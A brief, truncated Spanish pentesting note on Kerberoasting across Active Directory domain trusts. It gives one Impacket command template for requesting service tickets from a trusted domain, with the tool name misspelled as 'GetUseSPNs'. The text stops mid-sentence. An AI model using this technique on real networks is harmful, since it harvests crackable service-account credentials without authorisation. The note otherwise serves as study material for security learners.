#AD #SPN #KERBEROASTING

>Esta vulnerabilidad se puede explotar cuando llegas a un dominio, y no puedes escalar mas para arriba, y hay mas dominios con confianzas

Necesitaremos un usuario con credenciales y el dominio al que queremos llegar, usaremos [[IMPACKET]] con `GetUseSPNs`

```shell
impacket-GetUseSPNs -target-domain <dominio.objetivo> <dominio.actual>/<user>
```

Con el comando 